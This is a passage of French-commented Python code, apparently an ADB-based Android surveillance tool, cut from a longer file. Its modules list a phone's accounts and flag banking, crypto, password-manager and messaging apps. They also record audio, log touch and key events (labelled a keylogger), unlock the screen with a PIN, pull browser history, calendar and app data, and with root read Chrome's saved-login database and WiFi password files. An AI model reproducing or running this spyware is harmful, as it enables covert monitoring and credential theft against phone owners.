    adb_shell(f"cmd media_session volume --set {level}")
    print_success(f"Volume réglé à {level}")

# ═══════════════════════════════════════════════════════════════════════════════
# MODULE 14: SHELL INTERACTIF
# ═══════════════════════════════════════════════════════════════════════════════

def interactive_shell():
    """Shell interactif"""
    print(f"\n{C.CYAN}{'═'*70}{C.END}")
    print(f"{C.BOLD}💻 SHELL INTERACTIF{C.END}")
    print(f"{C.CYAN}{'═'*70}{C.END}\n")
    
    print_info("Tapez 'exit' pour quitter")
    print_info("Exemples: ls /sdcard, cat /proc/cpuinfo, getprop\n")
    
    while True:
        try:
            cmd = input(f"{C.GREEN}shell>{C.END} ").strip()
            
            if cmd.lower() == 'exit':
                break
            
            if cmd:
                result = adb_shell(cmd)
                print(result)
        except KeyboardInterrupt:
            break
    
    print_info("Shell fermé")

# ═══════════════════════════════════════════════════════════════════════════════
# MODULE 15: COMPTES ET IDENTIFIANTS
# ═══════════════════════════════════════════════════════════════════════════════

def get_accounts():
    """Récupérer tous les comptes enregistrés"""
    print(f"\n{C.CYAN}{'═'*70}{C.END}")
    print(f"{C.BOLD}👤 COMPTES ENREGISTRÉS{C.END}")
    print(f"{C.CYAN}{'═'*70}{C.END}\n")
    
    accounts = adb_shell("dumpsys account")
    
    # Extraire les comptes
    account_list = []
    
    print(f"    {C.YELLOW}Comptes trouvés:{C.END}\n")
    
    for line in accounts.split('\n'):
        if 'Account {name=' in line:
            # Format: Account {name=email@gmail.com, type=com.google}
            try:
                name = line.split('name=')[1].split(',')[0]
                acc_type = line.split('type=')[1].split('}')[0]
                account_list.append({"name": name, "type": acc_type})
                
                # Icône selon le type
                if 'google' in acc_type.lower():
                    icon = "🔴"
                elif 'facebook' in acc_type.lower():
                    icon = "🔵"
                elif 'whatsapp' in acc_type.lower():
                    icon = "🟢"
                elif 'samsung' in acc_type.lower():
                    icon = "🔷"
                else:
                    icon = "👤"
                
                print(f"        {icon} {name}")
                print(f"           Type: {acc_type}")
            except:
                pass
    
    # Sauvegarder
    with open(OUTPUT_BASE / "System" / "accounts.json", "w", encoding="utf-8") as f:
        json.dump(account_list, f, indent=2, ensure_ascii=False)
    
    with open(OUTPUT_BASE / "System" / "accounts_raw.txt", "w", encoding="utf-8") as f:
        f.write(accounts)
    
    print(f"\n{C.GREEN}    ✅ {len(account_list)} comptes trouvés{C.END}")
    print_success("Sauvegardé: System/accounts.json")
    
    return account_list

# ═══════════════════════════════════════════════════════════════════════════════
# MODULE 16: APPS SENSIBLES ET DONNÉES BANCAIRES
# ═══════════════════════════════════════════════════════════════════════════════

def detect_sensitive_apps():
    """Détecter les applications sensibles (banque, crypto, etc.)"""
    print(f"\n{C.CYAN}{'═'*70}{C.END}")
    print(f"{C.BOLD}🔐 DÉTECTION APPS SENSIBLES{C.END}")
    print(f"{C.CYAN}{'═'*70}{C.END}\n")
    
    # Liste des apps sensibles par catégorie
    SENSITIVE_APPS = {
        "💳 BANQUE / PAIEMENT": [
            ("com.paypal.android.p2pmobile", "PayPal"),
            ("com.venmo", "Venmo"),
            ("com.squareup.cash", "Cash App"),
            ("com.google.android.apps.walletnfcrel", "Google Pay"),
            ("com.samsung.android.spay", "Samsung Pay"),
            ("com.apple.android.music", "Apple Pay"),
            ("com.revolut.revolut", "Revolut"),
            ("com.n26.android", "N26"),
            ("com.wf.wellsfargomobile", "Wells Fargo"),
            ("com.chase.sig.android", "Chase"),
            ("com.bankofamerica.cashpromobile", "Bank of America"),
            ("fr.bnpp.mescomptes", "BNP Paribas"),
            ("com.cic_prod.bad", "CIC"),
            ("com.cm_prod.bad", "Crédit Mutuel"),
            ("com.labanquepostale.ecoapp", "La Banque Postale"),
            ("com.boursorama.android.clients", "Boursorama"),
            ("fr.lcl.android.customerarea", "LCL"),
            ("mobi.societegenerale.mobile.lappli", "Société Générale"),
        ],
        "🪙 CRYPTO": [
            ("com.binance.dev", "Binance"),
            ("com.coinbase.android", "Coinbase"),
            ("piuk.blockchain.android", "Blockchain.com"),
            ("com.wallet.crypto.trustapp", "Trust Wallet"),
            ("io.metamask", "MetaMask"),
            ("com.kraken.trade", "Kraken"),
            ("exodusmovement.exodus", "Exodus"),
            ("com.krakenfutures.app", "Kraken Futures"),
            ("com.robinhood.android", "Robinhood"),
        ],
        "💬 MESSAGERIE PRIVÉE": [
            ("com.whatsapp", "WhatsApp"),
            ("org.telegram.messenger", "Telegram"),
            ("com.Slack", "Slack"),
            ("com.discord", "Discord"),
            ("org.thoughtcrime.securesms", "Signal"),
            ("com.viber.voip", "Viber"),
            ("com.snapchat.android", "Snapchat"),
            ("com.facebook.orca", "Messenger"),
        ],
        "📧 EMAIL": [
            ("com.google.android.gm", "Gmail"),
            ("com.microsoft.office.outlook", "Outlook"),
            ("com.yahoo.mobile.client.android.mail", "Yahoo Mail"),
            ("com.apple.android.email", "Apple Mail"),
        ],
        "☁️ CLOUD / STOCKAGE": [
            ("com.google.android.apps.docs", "Google Drive"),
            ("com.dropbox.android", "Dropbox"),
            ("com.microsoft.skydrive", "OneDrive"),
            ("com.apple.android.icloud", "iCloud"),
        ],
        "🔑 MOTS DE PASSE": [
            ("com.lastpass.lpandroid", "LastPass"),
            ("com.x8bit.bitwarden", "Bitwarden"),
            ("com.agilebits.onepassword", "1Password"),
            ("com.dashlane", "Dashlane"),
            ("keepass2android.keepass2android", "KeePass"),
        ],
        "📱 RÉSEAUX SOCIAUX": [
            ("com.instagram.android", "Instagram"),
            ("com.facebook.katana", "Facebook"),
            ("com.twitter.android", "Twitter/X"),
            ("com.zhiliaoapp.musically", "TikTok"),
            ("com.linkedin.android", "LinkedIn"),
            ("com.pinterest", "Pinterest"),
        ],
    }
    
    # Obtenir la liste des apps installées
    installed = adb_shell("pm list packages")
    
    found_sensitive = {}
    total_found = 0
    
    for category, apps in SENSITIVE_APPS.items():
        found_in_category = []
        
        for package, name in apps:
            if package in installed:
                found_in_category.append({"package": package, "name": name})
                total_found += 1
        
        if found_in_category:
            found_sensitive[category] = found_in_category
            print(f"    {C.RED}{category}{C.END}")
            for app in found_in_category:
                print(f"        ⚠️  {app['name']} ({app['package']})")
            print()
    
    # Sauvegarder
    with open(OUTPUT_BASE / "Apps" / "sensitive_apps.json", "w", encoding="utf-8") as f:
        json.dump(found_sensitive, f, indent=2, ensure_ascii=False)
    
    print(f"\n{C.RED}    🚨 {total_found} APPLICATIONS SENSIBLES DÉTECTÉES!{C.END}")
    print_success("Sauvegardé: Apps/sensitive_apps.json")
    
    return found_sensitive

# ═══════════════════════════════════════════════════════════════════════════════
# MODULE 17: ENREGISTREMENT AUDIO
# ═══════════════════════════════════════════════════════════════════════════════

def record_audio(duration=30):
    """Enregistrer le microphone"""
    print(f"\n{C.CYAN}{'═'*70}{C.END}")
    print(f"{C.BOLD}🎤 ENREGISTREMENT AUDIO{C.END}")
    print(f"{C.CYAN}{'═'*70}{C.END}\n")
    
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    remote_file = f"/sdcard/audio_{timestamp}.mp4"
    local_file = OUTPUT_BASE / "Recordings" / f"audio_{timestamp}.mp4"
    
    print_info(f"Enregistrement audio pendant {duration} secondes...")
    print_warning("Le microphone du téléphone enregistre l'environnement")
    
    # Utiliser mediarecorder via am
    # Note: Nécessite une app d'enregistrement ou utiliser input
    adb_shell(f"am start -a android.provider.MediaStore.RECORD_SOUND")
    time.sleep(2)
    
    # Alternative: screenrecord capture aussi l'audio
    print_info("Utilisation de la capture avec audio...")
    adb_shell(f"screenrecord --time-limit {duration} --bit-rate 1000000 {remote_file}", timeout=duration+10)
    
    adb_pull(remote_file, str(local_file))
    adb_shell(f"rm {remote_file}")
    
    if local_file.exists():
        print_success(f"Audio sauvegardé: {local_file.name}")
        print_info(f"Chemin du fichier audio : {local_file}")
        return str(local_file)
    else:
        print_warning("Capture audio limitée - essayez avec une app d'enregistrement")
        return None

# ═══════════════════════════════════════════════════════════════════════════════
# MODULE 18: KEYLOGGER SIMPLE
# ═══════════════════════════════════════════════════════════════════════════════

def capture_input_events():
    """Capturer les événements d'entrée (touches, écran)"""
    print(f"\n{C.CYAN}{'═'*70}{C.END}")
    print(f"{C.BOLD}⌨️ CAPTURE D'ÉVÉNEMENTS{C.END}")
    print(f"{C.CYAN}{'═'*70}{C.END}\n")
    
    print_info("Capture des événements tactiles pendant 10 secondes...")
    print_warning("Touchez l'écran du téléphone pour tester")
    
    # getevent capture les événements bruts
    events = adb_shell("timeout 10 getevent -l", timeout=15)
    
    # Analyser
    touch_count = events.count("ABS_MT")
    key_count = events.count("KEY_")
    
    print(f"\n    📊 Résultats:")
    print_data("Événements tactiles", touch_count)
    print_data("Événements clavier", key_count)
    
    # Sauvegarder
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    with open(OUTPUT_BASE / "System" / f"input_events_{timestamp}.txt", "w", encoding="utf-8") as f:
        f.write(events)
    
    print_success(f"Sauvegardé: System/input_events_{timestamp}.txt")
    
    return events

# ═══════════════════════════════════════════════════════════════════════════════
# MODULE 18B: CONTRÔLE ÉCRAN AVANCÉ
# ═══════════════════════════════════════════════════════════════════════════════

def screen_off():
    """Éteindre l'écran"""
    adb_shell("input keyevent KEYCODE_POWER")
    print_success("Écran éteint")

def screen_on():
    """Allumer l'écran"""
    adb_shell("input keyevent KEYCODE_WAKEUP")
    print_success("Écran allumé")

def unlock_screen(pin=""):
    """Déverrouiller l'écran (swipe + PIN optionnel)"""
    print(f"\n{C.CYAN}{'═'*70}{C.END}")
    print(f"{C.BOLD}🔓 DÉVERROUILLAGE ÉCRAN{C.END}")
    print(f"{C.CYAN}{'═'*70}{C.END}\n")
    
    # Allumer l'écran
    adb_shell("input keyevent KEYCODE_WAKEUP")
    time.sleep(0.5)
    
    # Swipe pour déverrouiller
    adb_shell("input swipe 540 1800 540 800 300")
    time.sleep(0.5)
    
    # Si PIN fourni
    if pin:
        adb_shell(f'input text "{pin}"')
        time.sleep(0.3)
        adb_shell("input keyevent KEYCODE_ENTER")
    
    print_success("Tentative de déverrouillage effectuée")

def lock_screen():
    """Verrouiller l'écran"""
    adb_shell("input keyevent KEYCODE_POWER")
    print_success("Écran verrouillé")

def set_brightness(level):
    """Régler la luminosité (0-255)"""
    level = max(0, min(255, int(level)))
    adb_shell(f"settings put system screen_brightness {level}")
    print_success(f"Luminosité réglée à {level}/255")

def rotate_screen(orientation):
    """Rotation écran: 0=portrait, 1=paysage, 2=portrait inversé, 3=paysage inversé"""
    adb_shell("settings put system accelerometer_rotation 0")
    adb_shell(f"settings put system user_rotation {orientation}")
    orientations = {0: "Portrait", 1: "Paysage", 2: "Portrait inversé", 3: "Paysage inversé"}
    print_success(f"Orientation: {orientations.get(orientation, orientation)}")

# ═══════════════════════════════════════════════════════════════════════════════
# MODULE 18C: CONTRÔLE AUDIO/MÉDIA
# ═══════════════════════════════════════════════════════════════════════════════

def media_play_pause():
    """Play/Pause média"""
    adb_shell("input keyevent KEYCODE_MEDIA_PLAY_PAUSE")
    print_success("Play/Pause envoyé")

def media_next():
    """Piste suivante"""
    adb_shell("input keyevent KEYCODE_MEDIA_NEXT")
    print_success("Piste suivante")

def media_previous():
    """Piste précédente"""
    adb_shell("input keyevent KEYCODE_MEDIA_PREVIOUS")
    print_success("Piste précédente")

def volume_up():
    """Augmenter le volume"""
    adb_shell("input keyevent KEYCODE_VOLUME_UP")
    print_success("Volume +")

def volume_down():
    """Baisser le volume"""
    adb_shell("input keyevent KEYCODE_VOLUME_DOWN")
    print_success("Volume -")

def volume_mute():
    """Couper le son"""
    adb_shell("input keyevent KEYCODE_VOLUME_MUTE")
    print_success("Son coupé")

def set_media_volume(level):
    """Régler le volume média (0-15)"""
    level = max(0, min(15, int(level)))
    adb_shell(f"cmd media_session volume --stream 3 --set {level}")
    print_success(f"Volume média: {level}/15")

def set_ringtone_volume(level):
    """Régler le volume sonnerie (0-7)"""
    level = max(0, min(7, int(level)))
    adb_shell(f"cmd media_session volume --stream 2 --set {level}")
    print_success(f"Volume sonnerie: {level}/7")

# ═══════════════════════════════════════════════════════════════════════════════
# MODULE 18D: SIMULATION TOUCHES
# ═══════════════════════════════════════════════════════════════════════════════

def tap_screen(x, y):
    """Toucher l'écran à une position"""
    adb_shell(f"input tap {x} {y}")
    print_success(f"Tap à ({x}, {y})")

def swipe_screen(x1, y1, x2, y2, duration=300):
    """Glisser sur l'écran"""
    adb_shell(f"input swipe {x1} {y1} {x2} {y2} {duration}")
    print_success(f"Swipe de ({x1},{y1}) à ({x2},{y2})")

def long_press(x, y, duration=1000):
    """Appui long"""
    adb_shell(f"input swipe {x} {y} {x} {y} {duration}")
    print_success(f"Appui long à ({x}, {y}) pendant {duration}ms")

def press_home():
    """Bouton Home"""
    adb_shell("input keyevent KEYCODE_HOME")
    print_success("Bouton Home")

def press_back():
    """Bouton Retour"""
    adb_shell("input keyevent KEYCODE_BACK")
    print_success("Bouton Retour")

def press_recent():
    """Bouton Apps récentes"""
    adb_shell("input keyevent KEYCODE_APP_SWITCH")
    print_success("Apps récentes")

def open_quick_settings():
    """Ouvrir paramètres rapides"""
    adb_shell("cmd statusbar expand-settings")
    print_success("Paramètres rapides ouverts")

def open_notifications_panel():
    """Ouvrir panneau notifications"""
    adb_shell("cmd statusbar expand-notifications")
    print_success("Panneau notifications ouvert")

def close_panels():
    """Fermer panneaux"""
    adb_shell("cmd statusbar collapse")
    print_success("Panneaux fermés")

# ═══════════════════════════════════════════════════════════════════════════════
# MODULE 18E: CONTRÔLE CONNECTIVITÉ
# ═══════════════════════════════════════════════════════════════════════════════

def toggle_wifi(enable=True):
    """Activer/Désactiver WiFi"""
    state = "enable" if enable else "disable"
    adb_shell(f"svc wifi {state}")
    print_success(f"WiFi {'activé' if enable else 'désactivé'}")

def toggle_mobile_data(enable=True):
    """Activer/Désactiver données mobiles"""
    state = "enable" if enable else "disable"
    adb_shell(f"svc data {state}")
    print_success(f"Données mobiles {'activées' if enable else 'désactivées'}")

def toggle_bluetooth(enable=True):
    """Activer/Désactiver Bluetooth"""
    state = "enable" if enable else "disable"
    adb_shell(f"cmd bluetooth_manager {state}")
    print_success(f"Bluetooth {'activé' if enable else 'désactivé'}")

def toggle_airplane_mode(enable=True):
    """Activer/Désactiver mode avion"""
    value = "1" if enable else "0"
    adb_shell(f"settings put global airplane_mode_on {value}")
    adb_shell("am broadcast -a android.intent.action.AIRPLANE_MODE")
    print_success(f"Mode avion {'activé' if enable else 'désactivé'}")

def toggle_location(enable=True):
    """Activer/Désactiver localisation"""
    mode = "3" if enable else "0"
    adb_shell(f"settings put secure location_mode {mode}")
    print_success(f"Localisation {'activée' if enable else 'désactivée'}")

def get_current_wifi():
    """Obtenir le WiFi actuel"""
    result = adb_shell("dumpsys wifi | grep 'mWifiInfo'")
    print_data("WiFi actuel", result[:100] if result else "Non connecté")
    return result

def get_ip_address():
    """Obtenir l'adresse IP"""
    ip = adb_shell("ip addr show wlan0 | grep 'inet ' | awk '{print $2}'")
    print_data("Adresse IP", ip if ip else "Non disponible")
    return ip

# ═══════════════════════════════════════════════════════════════════════════════
# MODULE 18F: FILE MANAGER
# ═══════════════════════════════════════════════════════════════════════════════

def list_files(path="/sdcard"):
    """Lister les fichiers d'un dossier"""
    print(f"\n{C.CYAN}{'═'*70}{C.END}")
    print(f"{C.BOLD}📁 CONTENU DE {path}{C.END}")
    print(f"{C.CYAN}{'═'*70}{C.END}\n")
    
    result = adb_shell(f"ls -la {path}")
    for line in result.split('\n')[:30]:
        if line.strip():
            print(f"        {line[:70]}")
    
    return result

def delete_file(path):
    """Supprimer un fichier"""
    result = adb_shell(f"rm -f {path}")
    print_success(f"Fichier supprimé: {path}")
    return result

def create_folder(path):
    """Créer un dossier"""
    result = adb_shell(f"mkdir -p {path}")
    print_success(f"Dossier créé: {path}")
    return result

def copy_file(src, dest):
    """Copier un fichier"""
    result = adb_shell(f"cp {src} {dest}")
    print_success(f"Copié: {src} → {dest}")
    return result

def move_file(src, dest):
    """Déplacer un fichier"""
    result = adb_shell(f"mv {src} {dest}")
    print_success(f"Déplacé: {src} → {dest}")
    return result

def get_file_info(path):
    """Informations sur un fichier"""
    stat = adb_shell(f"stat {path}")
    print_data("Info fichier", stat[:200])
    return stat

def search_files(pattern, path="/sdcard"):
    """Rechercher des fichiers"""
    print(f"\n{C.CYAN}{'═'*70}{C.END}")
    print(f"{C.BOLD}🔍 RECHERCHE: {pattern}{C.END}")
    print(f"{C.CYAN}{'═'*70}{C.END}\n")
    
    result = adb_shell(f"find {path} -name '*{pattern}*' 2>/dev/null | head -50")
    count = len([l for l in result.split('\n') if l.strip()])
    
    for line in result.split('\n')[:20]:
        if line.strip():
            print(f"        📄 {line}")
    
    print_success(f"{count} fichier(s) trouvé(s)")
    return result

def download_file(remote_path, local_name=None):
    """Télécharger un fichier spécifique"""
    if not local_name:
        local_name = os.path.basename(remote_path)
    
    local_path = OUTPUT_BASE / "Downloads" / local_name
    (OUTPUT_BASE / "Downloads").mkdir(exist_ok=True)
    
    adb_pull(remote_path, str(local_path))
    
    if local_path.exists():
        print_success(f"Téléchargé: {local_path}")
        return str(local_path)
    else:
        print_error("Échec du téléchargement")
        return None

def upload_file(local_path, remote_path="/sdcard/"):
    """Envoyer un fichier vers le téléphone"""
    if not os.path.exists(local_path):
        print_error(f"Fichier non trouvé: {local_path}")
        return False
    
    result = adb_push(local_path, remote_path)
    print_success(f"Envoyé: {local_path} → {remote_path}")
    return True

# ═══════════════════════════════════════════════════════════════════════════════
# MODULE 18G: SURVEILLANCE AVANCÉE
# ═══════════════════════════════════════════════════════════════════════════════

def get_battery_info():
    """Informations détaillées batterie"""
    print(f"\n{C.CYAN}{'═'*70}{C.END}")
    print(f"{C.BOLD}🔋 INFORMATIONS BATTERIE{C.END}")
    print(f"{C.CYAN}{'═'*70}{C.END}\n")
    
    battery = adb_shell("dumpsys battery")
    
    for line in battery.split('\n'):
        line = line.strip()
        if any(x in line.lower() for x in ['level', 'status', 'health', 'temperature', 'voltage', 'technology']):
            print(f"        {line}")
    
    return battery

def get_sensor_data():
    """Données des capteurs"""
    print(f"\n{C.CYAN}{'═'*70}{C.END}")
    print(f"{C.BOLD}📡 CAPTEURS{C.END}")
    print(f"{C.CYAN}{'═'*70}{C.END}\n")
    
    sensors = adb_shell("dumpsys sensorservice | head -100")
    
    for line in sensors.split('\n')[:30]:
        if line.strip():
            print(f"        {line[:70]}")
    
    return sensors

def get_screen_state():
    """État de l'écran"""
    result = adb_shell("dumpsys display | grep 'mScreenState'")
    state = "Allumé" if "ON" in result.upper() else "Éteint"
    print_data("État écran", state)
    return state

def get_foreground_app():
    """Application au premier plan"""
    result = adb_shell("dumpsys activity activities | grep 'mResumedActivity'")
    if result:
        try:
            app = result.split('/')[0].split()[-1]
            print_data("App active", app)
            return app
        except:
            pass
    print_data("App active", "Inconnue")
    return None

def monitor_logcat(duration=10, filter_tag=""):
    """Surveiller les logs en temps réel"""
    print(f"\n{C.CYAN}{'═'*70}{C.END}")
    print(f"{C.BOLD}📋 LOGS SYSTÈME ({duration}s){C.END}")
    print(f"{C.CYAN}{'═'*70}{C.END}\n")
    
    cmd = f"timeout {duration} logcat -d"
    if filter_tag:
        cmd += f" -s {filter_tag}"
    
    logs = adb_shell(cmd, timeout=duration+5)
    
    # Sauvegarder
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    log_file = OUTPUT_BASE / "System" / f"logcat_{timestamp}.txt"
    
    with open(log_file, "w", encoding="utf-8") as f:
        f.write(logs)
    
    # Afficher les dernières lignes
    lines = logs.split('\n')[-20:]
    for line in lines:
        if line.strip():
            print(f"        {line[:75]}")
    
    print_success(f"Logs sauvegardés: {log_file.name}")
    return logs

def get_device_uptime():
    """Temps de fonctionnement"""
    uptime = adb_shell("uptime")
    print_data("Uptime", uptime)
    return uptime

# ═══════════════════════════════════════════════════════════════════════════════
# MODULE 18H: ACTIONS SPÉCIALES
# ═══════════════════════════════════════════════════════════════════════════════

def take_bugreport():
    """Générer un rapport de bug complet"""
    print(f"\n{C.CYAN}{'═'*70}{C.END}")
    print(f"{C.BOLD}🐛 RAPPORT DE BUG{C.END}")
    print(f"{C.CYAN}{'═'*70}{C.END}\n")
    
    print_warning("Génération en cours (peut prendre 1-2 minutes)...")
    
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    local_file = OUTPUT_BASE / "System" / f"bugreport_{timestamp}.zip"
    
    result = adb(f'bugreport "{local_file}"', timeout=180)
    
    if local_file.exists():
        size = local_file.stat().st_size / (1024*1024)
        print_success(f"Rapport créé: {local_file.name} ({size:.1f} MB)")
    else:
        print_error("Échec de la génération")
    
    return str(local_file)

def reboot_device(mode="normal"):
    """Redémarrer le téléphone"""
    modes = {
        "normal": "",
        "recovery": "recovery",
        "bootloader": "bootloader",
        "fastboot": "bootloader"
    }
    
    if mode not in modes:
        print_error(f"Mode inconnu: {mode}")
        return False
    
    confirm = input(f"\n{C.RED}⚠️ Redémarrer en mode {mode}? (oui/non): {C.END}")
    if confirm.lower() != "oui":
        print_info("Annulé")
        return False
    
    cmd = f"reboot {modes[mode]}"
    adb(cmd)
    print_success(f"Redémarrage en mode {mode}...")
    return True

def force_stop_app(package):
    """Forcer l'arrêt d'une application"""
    adb_shell(f"am force-stop {package}")
    print_success(f"Application arrêtée: {package}")

def clear_app_data(package):
    """Effacer les données d'une application"""
    confirm = input(f"\n{C.RED}⚠️ Effacer les données de {package}? (oui/non): {C.END}")
    if confirm.lower() != "oui":
        print_info("Annulé")
        return False
    
    adb_shell(f"pm clear {package}")
    print_success(f"Données effacées: {package}")
    return True

def grant_permission(package, permission):
    """Accorder une permission à une app"""
    adb_shell(f"pm grant {package} {permission}")
    print_success(f"Permission accordée: {permission}")

def revoke_permission(package, permission):
    """Révoquer une permission"""
    adb_shell(f"pm revoke {package} {permission}")
    print_success(f"Permission révoquée: {permission}")

def disable_app(package):
    """Désactiver une application"""
    adb_shell(f"pm disable-user --user 0 {package}")
    print_success(f"Application désactivée: {package}")

def enable_app(package):
    """Réactiver une application"""
    adb_shell(f"pm enable {package}")
    print_success(f"Application réactivée: {package}")

# ═══════════════════════════════════════════════════════════════════════════════
# MODULE 18I: EXTRACTION AVANCÉE
# ═══════════════════════════════════════════════════════════════════════════════

def extract_browser_history():
    """Extraire l'historique du navigateur"""
    print(f"\n{C.CYAN}{'═'*70}{C.END}")
    print(f"{C.BOLD}🌐 HISTORIQUE NAVIGATEUR{C.END}")
    print(f"{C.CYAN}{'═'*70}{C.END}\n")
    
    # Chrome
    chrome_history = adb_shell("content query --uri content://com.android.chrome.browser/bookmarks")
    
    # Navigateur par défaut
    browser_history = adb_shell("content query --uri content://browser/bookmarks")
    
    all_history = chrome_history + "\n" + browser_history
    
    # Sauvegarder
    with open(OUTPUT_BASE / "System" / "browser_history.txt", "w", encoding="utf-8") as f:
        f.write(f"=== HISTORIQUE NAVIGATEUR - {datetime.now()} ===\n\n")
        f.write(all_history)
    
    count = all_history.count("Row:")
    print_success(f"{count} entrées trouvées")
    print_success("Sauvegardé: System/browser_history.txt")
    
    return all_history

def extract_calendar():
    """Extraire les événements du calendrier"""
    print(f"\n{C.CYAN}{'═'*70}{C.END}")
    print(f"{C.BOLD}📅 CALENDRIER{C.END}")
    print(f"{C.CYAN}{'═'*70}{C.END}\n")
    
    events = adb_shell('content query --uri content://com.android.calendar/events --projection "title,dtstart,dtend,description,eventLocation"')
    
    count = events.count("Row:")
    print_info(f"{count} événements trouvés")
    
    # Afficher les premiers
    for row in events.split("Row:")[:10]:
        if "title=" in row:
            try:
                title = row.split("title=")[1].split(",")[0][:50]
                print(f"        📆 {title}")
            except:
                pass
    
    # Sauvegarder
    with open(OUTPUT_BASE / "System" / "calendar.txt", "w", encoding="utf-8") as f:
        f.write(f"=== CALENDRIER - {datetime.now()} ===\n\n")
        f.write(events)
    
    print_success("Sauvegardé: System/calendar.txt")
    return events

def extract_saved_passwords():
    """Tenter d'extraire les mots de passe sauvegardés (nécessite root)"""
    print(f"\n{C.CYAN}{'═'*70}{C.END}")
    print(f"{C.BOLD}🔑 MOTS DE PASSE SAUVEGARDÉS{C.END}")
    print(f"{C.CYAN}{'═'*70}{C.END}\n")
    
    print_warning("Cette fonction nécessite un accès ROOT")
    
    # Vérifier root
    root_check = adb_shell("su -c 'id'")
    if "uid=0" not in root_check:
        print_error("Accès ROOT non disponible")
        return None
    
    # Bases de données Chrome
    chrome_db = adb_shell("su -c 'cat /data/data/com.android.chrome/app_chrome/Default/Login\\ Data' 2>/dev/null")
    
    # WiFi passwords
    wifi_passwords = adb_shell("su -c 'cat /data/misc/wifi/WifiConfigStore.xml'")
    
    # Sauvegarder
    with open(OUTPUT_BASE / "System" / "passwords.txt", "w", encoding="utf-8") as f:
        f.write(f"=== MOTS DE PASSE - {datetime.now()} ===\n\n")
        f.write("=== WIFI ===\n")
        f.write(wifi_passwords[:5000])
    
    print_success("Données sauvegardées: System/passwords.txt")
    return wifi_passwords

def extract_app_data(package):
    """Extraire les données d'une application spécifique"""
    print(f"\n{C.CYAN}{'═'*70}{C.END}")
    print(f"{C.BOLD}📦 DONNÉES DE {package}{C.END}")
    print(f"{C.CYAN}{'═'*70}{C.END}\n")
    
    # Créer dossier
    app_folder = OUTPUT_BASE / "Apps" / package.replace(".", "_")
    app_folder.mkdir(parents=True, exist_ok=True)
    
    # Infos de l'app
    info = adb_shell(f"dumpsys package {package}")
    with open(app_folder / "package_info.txt", "w", encoding="utf-8") as f:
        f.write(info)
    
    # Données partagées (si accessibles)
    shared_prefs = adb_shell(f"run-as {package} cat /data/data/{package}/shared_prefs/*.xml 2>/dev/null")
    if shared_prefs and "Error" not in shared_prefs:
        with open(app_folder / "shared_prefs.xml", "w", encoding="utf-8") as f:
            f.write(shared_prefs)
        print_success("SharedPreferences extraites")
    
    # Databases
    databases = adb_shell(f"run-as {package} ls /data/data/{package}/databases/ 2>/dev/null")
    if databases and "Error" not in databases:
        with open(app_folder / "databases_list.txt", "w", encoding="utf-8") as f:
            f.write(databases)
        print_success("Liste des bases de données extraite")
    
    print_success(f"Données sauvegardées dans: Apps/{package.replace('.', '_')}/")
    return app_folder

# ═══════════════════════════════════════════════════════════════════════════════
# MODULE 18J: FONCTIONNALITÉS AVANCÉES QUI MARCHENT À 100%
# ═══════════════════════════════════════════════════════════════════════════════

def send_sms_real(number, message):
    """Envoyer un SMS réel (nécessite permissions)"""
    print(f"\n{C.CYAN}{'═'*70}{C.END}")
    print(f"{C.BOLD}📱 ENVOI SMS RÉEL{C.END}")
    print(f"{C.CYAN}{'═'*70}{C.END}\n")
    
    # Méthode via service SMS
    message_escaped = message.replace('"', '\\"').replace("'", "\\'")
    
    # Utiliser am pour envoyer via l'app SMS par défaut
    adb_shell(f'am start -a android.intent.action.SENDTO -d "sms:{number}" --es sms_body "{message_escaped}" --ez exit_on_sent true')
    time.sleep(1)
    
    # Simuler le bouton envoyer
    adb_shell("input keyevent KEYCODE_TAB")
    time.sleep(0.3)
    adb_shell("input keyevent KEYCODE_ENTER")
    
    print_success(f"SMS préparé pour {number}")
    print_info("Vérifiez l'écran du téléphone pour confirmer l'envoi")
    return True

def make_call_and_speaker(number):
    """Passer un appel et activer le haut-parleur"""
    print(f"\n{C.CYAN}{'═'*70}{C.END}")
    print(f"{C.BOLD}📞 APPEL AVEC HAUT-PARLEUR{C.END}")
    print(f"{C.CYAN}{'═'*70}{C.END}\n")
    
    # Lancer l'appel
    adb_shell(f'am start -a android.intent.action.CALL -d "tel:{number}"')
    print_info(f"Appel vers {number} en cours...")
    
    time.sleep(3)
    
    # Activer haut-parleur
    adb_shell("input keyevent KEYCODE_VOLUME_UP")
    adb_shell("cmd audio set-volume 3 15")  # Volume appel au max
    
    print_success("Appel lancé - Haut-parleur activé")
    return True

def end_call():
    """Raccrocher l'appel en cours"""
    adb_shell("input keyevent KEYCODE_ENDCALL")
    print_success("Appel terminé")

def answer_call():
    """Répondre à un appel entrant"""
    adb_shell("input keyevent KEYCODE_CALL")
    print_success("Appel accepté")

def reject_call():
    """Rejeter un appel entrant"""
    adb_shell("input keyevent KEYCODE_ENDCALL")
    print_success("Appel rejeté")

def get_current_activity():
    """Obtenir l'activité/app actuellement affichée"""
    result = adb_shell("dumpsys window | grep -E 'mCurrentFocus|mFocusedApp'")
    
    print(f"\n{C.CYAN}{'═'*70}{C.END}")
    print(f"{C.BOLD}📱 ACTIVITÉ ACTUELLE{C.END}")
    print(f"{C.CYAN}{'═'*70}{C.END}\n")
    
    for line in result.split('\n'):
        if line.strip():
            print(f"    {line.strip()}")
    
    return result

def take_screenshot_to_pc():
    """Capture d'écran directe vers PC (rapide)"""
    print(f"\n{C.CYAN}{'═'*70}{C.END}")
    print(f"{C.BOLD}📸 CAPTURE ÉCRAN RAPIDE{C.END}")
    print(f"{C.CYAN}{'═'*70}{C.END}\n")
    
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    local_file = OUTPUT_BASE / "Screenshots" / f"quick_{timestamp}.png"
    
    # Capture directe via exec-out (plus rapide)
    cmd = f'"{ADB_PATH}" -s {DEVICE} exec-out screencap -p > "{local_file}"'
    os.system(cmd)
    
    if local_file.exists() and local_file.stat().st_size > 1000:
        size = local_file.stat().st_size / 1024
        print_success(f"Capture: {local_file.name} ({size:.1f} KB)")
        return str(local_file)
    else:
        print_error("Échec - utilisation méthode standard...")
        return take_screenshot()

def continuous_screenshots(count=5, interval=2):
    """Prendre plusieurs captures d'écran en série"""
    print(f"\n{C.CYAN}{'═'*70}{C.END}")
    print(f"{C.BOLD}📸 CAPTURES EN SÉRIE ({count}x){C.END}")
    print(f"{C.CYAN}{'═'*70}{C.END}\n")
    
    screenshots = []
    for i in range(count):
